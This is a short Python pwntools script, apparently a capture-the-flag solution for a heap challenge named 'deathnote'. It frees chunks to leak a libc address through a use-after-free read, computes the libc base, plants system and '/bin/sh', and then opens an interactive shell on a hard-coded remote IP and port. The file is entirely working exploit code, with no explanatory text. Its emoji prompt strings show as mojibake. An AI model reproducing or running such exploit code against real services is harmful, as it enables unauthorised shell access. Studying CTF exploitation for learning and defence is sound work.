from pwn import *
import warnings

warnings.filterwarnings('ignore')
context.binary = binary = ELF('./deathnote_patched', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)

def create(idx, size, data):
	p.sendlineafter('ğŸ’€', b'1')
	p.sendlineafter('ğŸ’€', str(size).encode())
	p.sendlineafter('ğŸ’€', str(idx).encode())
	p.sendlineafter('ğŸ’€', data)

def delete(idx):
	p.sendlineafter('ğŸ’€', b'2')
	p.sendlineafter('ğŸ’€', str(idx).encode())

def view(idx):
	p.sendlineafter('ğŸ’€', b'3')
	p.sendlineafter('ğŸ’€', str(idx).encode())

	p.recvuntil(b'Page content: ')
	return p.recvline()[:-1]

#p = process()
p = remote('94.237.50.156',42745)

for i in range(9):
	create(i, 0x80, b'aaaa')

for i in range(9):
	delete(i)

libc_leak = u64(view(7).ljust(8, b'\x00'))
print(f'LIBC Leak: {hex(libc_leak)}')

libc.address = libc_leak - 0x21ace0
print(f'LIBC Base: {hex(libc.address)}')

create(0, 24, hex(libc.symbols.system))
create(1, 24, b'/bin/sh\x00')

p.sendline(b'42')

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
